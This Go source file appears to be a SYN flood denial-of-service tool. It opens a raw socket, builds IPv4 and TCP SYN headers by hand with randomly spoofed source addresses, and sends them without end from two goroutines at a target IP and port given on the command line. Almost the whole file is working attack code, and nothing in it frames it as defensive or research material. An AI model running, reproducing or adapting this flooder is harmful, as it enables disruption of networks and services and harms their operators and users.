package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"syscall"
	"time"
)

func main() {
	host := flag.String("h", "", "Target IP")
	port := flag.Int("p", 0, "Target Port")
	source_mask := flag.String("sm", "0.0.0.0", "Source IP mask")
	flag.Parse()

	if *host == "" {
		fmt.Println("parameter h cannot be empty")
		return
	}

	if *port == 0 {
		fmt.Println("parameter p cannot be empty")
		return
	}

	if *source_mask == "" {
		fmt.Println("use source mask default 0.0.0.0 (world-wide)")
	}

	ipv4Addr_host := net.ParseIP(*host).To4()
	//目前没有实现ipv6
	if ipv4Addr_host == nil {
		fmt.Println("parameter h invalid IPv4 address")
		return
	}

	ipv4Addr_source_mask := net.ParseIP(*source_mask).To4()
	if ipv4Addr_source_mask == nil {
		fmt.Println("parameter sm invalid IPv4 address mask")
		return
	}

	handle(ipv4Addr_host, *port, ipv4Addr_source_mask)
}

func handle(ip net.IP, port int, source_mask net.IP) {
	//创建原始套接字
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println(err)
		return
	}

	//设置IP层信息，使其能够修改IP层数据
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		fmt.Println(err)
		return
	}

	for i := 0; i < 2; i++ {
		go func() {
			for {
			
				rand.Seed(time.Now().UnixNano())
				srcIP := net.IP(make([]byte, 4))
				binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))
				
				for j := 0; j < 4; j++ {
					if source_mask[j] == 0 {
						continue
					}
					// fmt.Printf("replace %v with %v", srcIP[j], source_mask[j])
					// stupid coding,.... 
					if j == 0 {
						srcIP = net.IPv4(source_mask[0], srcIP[1], srcIP[2], srcIP[3])
					}
					if j == 1 {
						srcIP = net.IPv4(srcIP[0], source_mask[1], srcIP[2], srcIP[3])
					}
					if j == 2 {
						srcIP = net.IPv4(srcIP[0], srcIP[1], source_mask[2], srcIP[3])
					}
					if j == 3 {
						srcIP = net.IPv4(srcIP[0], srcIP[1], srcIP[2], source_mask[3])
					}
				}

				ipv4Byte, _ := getIPV4Header(srcIP,ip)
				tcpByte, _ := getTcpHeader(srcIP,ip,port)

				// fmt.Printf("Debug: %v %v",source_mask, srcIP)

				//var b bytes.Buffer
				//b.Write(ipv4Byte)
				//b.Write(tcpByte)
				buffs := make([]byte,0)
				buffs = append(buffs,ipv4Byte... )
				buffs = append(buffs,tcpByte... )
				
				addr := syscall.SockaddrInet4{
					Port: port,
//					Addr: ip,
				}
				copy(addr.Addr[:4],ip)
				fmt.Printf("%v -->  %v %v \n",srcIP,ip,port )
				error := syscall.Sendto(fd, buffs, 0, &addr )
				if error != nil{
					fmt.Println("Sendto error ",error )
				}
			}
		}()
	}

	c := make(chan int, 1)
	<-c
}

func getIPV4Header(srcIp ,dstIp net.IP) ([]byte, error) {

	h := &ipv4Header{
		ID:       1,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Checksum: 0, // 系统自动填充
		Src:      srcIp,
		Dst:      dstIp,
	}
	return h.Marshal()
}

func CheckSum(data []byte) uint16 {
	var (
		sum    uint32
		length int = len(data)
		index  int
	)
	for length > 1 {
		sum += uint32(data[index])<<8 + uint32(data[index+1])
		index += 2
		length -= 2
	}
	if length > 0 {
		sum += uint32(data[index])
	}
	sum += (sum >> 16)

	return uint16(^sum)
}


type PsdHeader struct {
    SrcAddr   [4]uint8
    DstAddr   [4]uint8
    Zero      uint8
    ProtoType uint8
    TcpLength uint16
}

func getTcpHeader( srcIp,dstIp net.IP, dstPort int) ([]byte, error) {
	rand.Seed(time.Now().UnixNano())

	h := &tcpHeader{
		Src:  9765,
		Dst:  dstPort,
		Seq:  690,
		Ack:  0,
		Flag: 0x02,
		Win:  65535,
		Urp:  0,
	}
	h.Src = rand.Intn(1<<16-1)%16383 + 49152
	h.Seq = rand.Intn(1<<32 - 1)
	h.Win = 2048

	//b, _ := h.Marshal()
	h.Marshal()
	
	
    var (
        psdheader PsdHeader
    )
	/*填充TCP伪首部*/
   copy( psdheader.SrcAddr[:4],srcIp )
   copy( psdheader.DstAddr[:4],dstIp )
//    psdheader.SrcAddr = [4]uint8{ srcIp[0],srcIp[1],srcIp[2],srcIp[3] }
    psdheader.Zero = 0
    psdheader.ProtoType = syscall.IPPROTO_TCP
//    psdheader.TcpLength = uint16(unsafe.Sizeof(TCPHeader{})) + uint16(0)
    psdheader.TcpLength = uint16(20)
	
	/*buffer用来写入两种首部来求得校验和*/
    var (
        buffer bytes.Buffer
    )
    binary.Write(&buffer, binary.BigEndian, psdheader)
	buffs,_ := h.Marshal()
    buffer.Write(buffs)
	h.Sum = int(CheckSum(buffer.Bytes()))
	return h.Marshal()
}
